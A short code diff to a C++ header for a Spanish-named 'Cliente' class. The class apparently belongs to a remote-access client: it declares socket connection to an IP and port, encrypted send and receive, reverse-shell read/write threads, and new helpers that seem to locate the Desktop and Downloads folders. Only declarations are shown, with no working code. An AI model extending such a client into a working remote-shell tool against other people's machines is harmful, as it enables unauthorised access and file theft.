@@ -46,6 +46,11 @@ class Cliente {
 		bool isRunning = true;
 		bool isShellRunning = false;
 		bool BLOCK_MODE = true;
+
+		//Misc
+		std::string ObtenerDesk();
+		std::string ObtenerDown();
+
 		//Sockets
 		bool bConectar(const char* cIP, const char* cPuerto);
 		void CerrarConexion();
@@ -53,11 +58,6 @@ class Cliente {
 		//Socket wraps
 		int cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock = false);
 		int cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool isBlock = false);
-
-		//Reverse shell
-		//void SpawnShell(const std::string strComando);
-		//void thLeerShell(HANDLE hPipe);
-		//void thEscribirShell(HANDLE hPipe);
 
 		ByteArray bDec(const unsigned char* pInput, size_t pLen);
 		ByteArray bEnc(const unsigned char* pInput, size_t pLen);
@@ -86,11 +86,6 @@ public:
 
 	void thEscribirShell(std::string pStrInput);
 	void thLeerShell(HANDLE hPipe);
-
-
-
-
-
 };
 
 #endif
